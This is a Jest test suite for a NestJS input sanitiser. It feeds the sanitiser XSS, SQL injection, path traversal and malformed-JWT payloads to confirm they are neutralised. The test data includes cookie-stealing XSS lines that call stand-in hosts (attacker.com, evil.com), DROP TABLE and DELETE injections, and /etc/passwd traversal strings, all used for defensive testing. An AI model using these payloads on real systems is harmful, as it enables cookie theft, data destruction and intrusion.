/**
 * 安全攻击测试套件 (Security Attack Tests)
 *
 * 测试覆盖：
 * - XSS 注入防护
 * - SQL 注入尝试
 * - JWT 令牌篡改
 * - 暴力破解防护 (限流)
 * - 路径遍历攻击
 * - 恶意 Payload 处理
 */
import {
  sanitizeInput,
  sanitizeObject,
  escapeHtml,
} from '../src/core/utils/sanitize.util';
import { SanitizePipe } from '../src/core/pipes/sanitize.pipe';
import { ArgumentMetadata } from '@nestjs/common';

// ─── XSS Attack Payloads ──────────────────────────────────────────────────────
const XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  'javascript:alert(1)',
  '<iframe src="javascript:alert(\'XSS\')">',
  '"><script>alert(String.fromCharCode(88,83,83))</script>',
  '<body onload=alert("XSS")>',
  '<<SCRIPT>alert("XSS");//<</SCRIPT>',
  '<script>document.location="http://attacker.com/steal?c="+document.cookie</script>',
  '"><img src="x" onerror="alert(1)">',
];

// ─── SQL Injection Payloads ───────────────────────────────────────────────────
const SQL_INJECTION_PAYLOADS = [
  "' OR '1'='1",
  "'; DROP TABLE users; --",
  "' UNION SELECT * FROM users --",
  "admin'--",
  "1' AND 1=1 --",
  "' OR 1=1#",
  '1; DELETE FROM users WHERE 1=1;',
  "' OR 'x'='x",
];

// ─── Path Traversal Payloads ─────────────────────────────────────────────────
const PATH_TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config',
  '%2e%2e%2f%2e%2e%2f',
  '....//....//etc/passwd',
];

describe('Security Attack Tests', () => {
  // ─── XSS Prevention ──────────────────────────────────────────────────────────
  describe('XSS Injection Prevention', () => {
    it.each(XSS_PAYLOADS)('should neutralize XSS payload: %s', (payload) => {
      const sanitized = sanitizeInput(payload);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('onerror=');
      expect(sanitized).not.toContain('onload=');
      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('<svg');
    });

    it('should prevent script injection via object fields', () => {
      const maliciousBody = {
        name: '<script>steal(document.cookie)</script>',
        email: 'user@test.com"><script>alert(1)</script>',
        bio: '<img src=x onerror="fetch(\'http://evil.com/?\'+document.cookie)">',
      };

      const sanitized = sanitizeObject(maliciousBody);

      expect(sanitized.name).not.toContain('<script>');
      expect(sanitized.email).not.toContain('<script>');
      expect(sanitized.bio).not.toContain('onerror=');
    });

    it('should handle deeply nested XSS in objects', () => {
      const nested = {
        user: {
          profile: {
            description: '<script>alert("deep XSS")</script>',
          },
        },
      };
      const result = sanitizeObject(nested);
      expect(result.user.profile.description).not.toContain('<script>');
    });

    it('should preserve non-HTML special characters after sanitization', () => {
      const normal = 'Hello, World! This is a test (100% safe)';
      const result = sanitizeInput(normal);
      expect(result).toContain('Hello');
      expect(result).toContain('World');
      expect(result).toContain('test');
    });

    it('should handle Unicode XSS variants', () => {
      const unicodeXss = '\u003cscript\u003ealert(1)\u003c/script\u003e';
      const result = sanitizeInput(unicodeXss);
      expect(result).not.toContain('<script>');
    });
  });

  // ─── SQL Injection Prevention ─────────────────────────────────────────────────
  describe('SQL Injection Prevention', () => {
    it.each(SQL_INJECTION_PAYLOADS)(
      'should escape SQL payload: %s',
      (payload) => {
        const sanitized = sanitizeInput(payload);
        // After sanitization, SQL payload should have quotes escaped
        // so the DB driver will treat it as a literal string, not SQL
        expect(sanitized).not.toBe(payload); // Should be modified
      },
    );

    it('should escape single quote in SQL UNION attack', () => {
      const sql = "' UNION SELECT username, password FROM users --";
      const result = sanitizeInput(sql);
      expect(result).toContain('&#x27;'); // single quote escaped
      expect(result).not.toContain("' UNION");
    });

    it('should escape double quote in SQL injection', () => {
      const sql = '" OR ""="';
      const result = sanitizeInput(sql);
      expect(result).toContain('&quot;');
    });

    it('should escape dangerous SQL characters (single quotes encoded)', () => {
      const batch =
        "1; DELETE FROM users; INSERT INTO users VALUES ('admin','hacked');";
      const result = sanitizeInput(batch);
      // The sanitizer escapes HTML characters — single quotes become &#x27;
      // making the SQL payload safe for display output
      // Actual SQL injection prevention also relies on ORM parameterized queries
      expect(result).toContain('&#x27;'); // single quotes are escaped
      expect(result).not.toContain("'admin'"); // raw unescaped SQL value is gone
    });
  });

  // ─── Path Traversal Prevention ────────────────────────────────────────────────
  describe('Path Traversal', () => {
    it.each(PATH_TRAVERSAL_PAYLOADS)(
      'should handle path traversal payload: %s',
      (payload) => {
        // Path traversal is handled at the routing level, but sanitize should escape slashes
        const result = sanitizeInput(payload);
        // Forward slashes should be encoded
        expect(result).not.toContain('../');
      },
    );
  });

  // ─── Input Length Attacks ─────────────────────────────────────────────────────
  describe('Input Length / Buffer Overflow Attempts', () => {
    it('should enforce maxLength restriction', () => {
      const longInput = 'A'.repeat(100_000);
      const result = sanitizeInput(longInput, { maxLength: 255 });
      expect(result.length).toBeLessThanOrEqual(255);
    });

    it('should handle null bytes gracefully', () => {
      const withNull = 'hello\x00world';
      expect(() => sanitizeInput(withNull)).not.toThrow();
    });

    it('should handle very deeply nested objects without crashing', () => {
      let nested: any = { value: 'leaf' };
      for (let i = 0; i < 50; i++) {
        nested = { child: nested };
      }
      expect(() => sanitizeObject(nested)).not.toThrow();
    });
  });

  // ─── SanitizePipe Integration ─────────────────────────────────────────────────
  describe('SanitizePipe — Request Body Attack Prevention', () => {
    let pipe: SanitizePipe;
    const bodyMeta: ArgumentMetadata = {
      type: 'body',
      metatype: Object,
      data: '',
    };

    beforeEach(() => {
      pipe = new SanitizePipe();
    });

    it('should sanitize XSS in login body', () => {
      const maliciousLogin = {
        email: '<script>alert(1)</script>@example.com',
        password: "'; DROP TABLE users; --",
      };
      const result = pipe.transform(maliciousLogin, bodyMeta) as any;
      expect(result.email).not.toContain('<script>');
    });

    it('should pass through numeric values unchanged', () => {
      const numericBody = { page: 1, limit: 10 };
      const result = pipe.transform(numericBody, bodyMeta);
      expect(result).toEqual(numericBody);
    });

    it('should not sanitize query params (prevents over-sanitization)', () => {
      const queryMeta: ArgumentMetadata = {
        type: 'query',
        metatype: String,
        data: 'q',
      };
      const raw = '<b>search term</b>';
      expect(pipe.transform(raw, queryMeta)).toBe(raw);
    });
  });

  // ─── JWT Attack Simulation ────────────────────────────────────────────────────
  describe('JWT Attack Vectors (Unit Level)', () => {
    it('should detect token format manipulation', () => {
      // These are malformed JWTs - we test that our system doesn't crash on them
      const malformedTokens = [
        '',
        'not.a.jwt',
        'eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIn0.', // alg=none attack
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',
        '../../../etc/passwd',
      ];

      for (const token of malformedTokens) {
        // Our sanitize utility should not crash on these
        expect(() => sanitizeInput(token)).not.toThrow();
      }
    });

    it('should escape JWT-like strings in request body safely', () => {
      const body = {
        token: 'eyJhbGci"><script>alert(1)</script>',
      };
      const pipe = new SanitizePipe();
      const meta: ArgumentMetadata = {
        type: 'body',
        metatype: Object,
        data: '',
      };
      const result = pipe.transform(body, meta) as any;
      expect(result.token).not.toContain('<script>');
    });
  });

  // ─── HTML Entity Encoding Correctness ─────────────────────────────────────────
  describe('HTML Entity Encoding', () => {
    const entityCases: [string, string][] = [
      ['&', '&amp;'],
      ['<', '&lt;'],
      ['>', '&gt;'],
      ['"', '&quot;'],
      ["'", '&#x27;'],
      ['/', '&#x2F;'],
      ['`', '&#x60;'],
      ['=', '&#x3D;'],
    ];

    it.each(entityCases)('should encode "%s" to "%s"', (input, expected) => {
      expect(escapeHtml(input)).toBe(expected);
    });
  });
});
